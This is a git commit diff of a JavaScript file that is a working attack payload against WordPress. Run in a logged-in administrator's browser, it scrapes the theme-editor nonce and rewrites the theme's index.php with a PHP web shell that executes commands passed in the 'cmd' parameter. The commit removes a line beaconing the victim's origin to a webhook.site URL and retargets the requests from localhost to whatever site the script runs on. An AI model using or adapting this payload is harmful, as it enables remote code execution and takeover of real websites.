838ce45276391cd7f9341621eb611570fd86525d
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 11:49:02 +0300

    Update phaedon.js

--- phaedon.js
+++ phaedon.js
@@ -1,6 +1,5 @@
 async function pepe(){
-    await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+location.origin,{mode:'no-cors'});
-    var a = await fetch('http://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
+    var a = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
     console.log(a);//try with a different file 
     return a;
 }
@@ -8,7 +7,7 @@ async function pepe(){
 try{
 var a = await pepe();
 
-fetch("http://localhost:1024/wp-admin/admin-ajax.php", {
+fetch("/wp-admin/admin-ajax.php", {
     "headers":{"Content-type":"application/x-www-form-urlencoded"},
 "body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
 ?>&action=edit-theme-plugin-file&file=index.php&theme=twentytwentytwo`,
